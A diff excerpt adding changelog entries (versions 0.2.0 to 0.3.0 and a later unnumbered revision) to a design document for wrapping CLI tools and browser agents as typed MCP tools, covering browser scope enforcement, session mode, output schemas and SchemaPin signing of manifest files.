+- Added browser scope enforcement details (navigation, redirect interception, link click validation)
+- Added browser applications table (web testing, competitive intelligence, form filling, scraping, authenticated workflows)
+- Simplified SchemaPin integration: removed `[tool.schemapin]` manifest section entirely. SchemaPin signs `.clad.toml` files directly as first-class artifacts using existing `.well-known/schemapin.json` discovery. Zero per-manifest configuration needed.
+- Updated security model with browser agent governance comparison
+- Updated open protocol scope to include BrowserExecutor and browser-specific components
+- Added remaining open questions for HTTP API backends, MCP passthrough, and browser authentication flows
+
+### v0.3.0 (2026-03-20)
+
+- Added Session Mode for interactive CLI tools (per-interaction ORGA gating, session commands as typed MCP tools, prompt-based state inference, SessionExecutor architecture)
+- Made output schema (`[output.schema]`) mandatory; generates MCP `outputSchema` alongside `inputSchema`
+- Resolved hot reload (dev-only), remote manifests (local-only v1), manifest versioning (tracks CLI tool version), and output schema from open questions
+- Added design principle on conditional complexity with escape hatch guidance
+- Expanded remaining open questions to cover TUI tools, nested sessions, and unsolicited output
+
+### v0.2.0 (2026-03-20)
+
+- Initial design document with oneshot execution model, type system, command construction, output handling, Symbiont integration, migration path, open protocol scope, CLI support, and SchemaPin integration
